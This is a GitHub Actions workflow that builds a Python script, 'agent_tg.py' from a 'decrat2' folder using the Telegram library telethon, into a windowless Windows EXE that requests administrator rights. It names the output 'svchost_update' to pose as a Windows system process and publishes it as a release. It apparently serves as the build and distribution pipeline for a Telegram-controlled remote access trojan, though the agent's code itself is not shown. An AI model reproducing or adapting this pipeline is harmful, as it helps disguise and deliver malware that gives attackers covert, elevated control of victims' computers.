name: Build and Release

on:
  push:
    branches:
      - main

jobs:
  build:
    runs-on: windows-latest

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Set up Python
        uses: actions/setup-python@v5
        with:
          python-version: "3.11"

      - name: Install dependencies
        run: pip install requests telethon pyinstaller

      - name: Build EXE
        working-directory: decrat2
        run: pyinstaller --onefile --noconsole --uac-admin --collect-all telethon --name="svchost_update" agent_tg.py

      - name: Get short SHA
        id: sha
        run: echo "short=$(git rev-parse --short HEAD)" >> $env:GITHUB_OUTPUT

      - name: Create Release
        uses: softprops/action-gh-release@v2
        with:
          tag_name: build-${{ steps.sha.outputs.short }}
          name: "svchost_update ${{ steps.sha.outputs.short }}"
          files: decrat2/dist/svchost_update.exe
        env:
          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
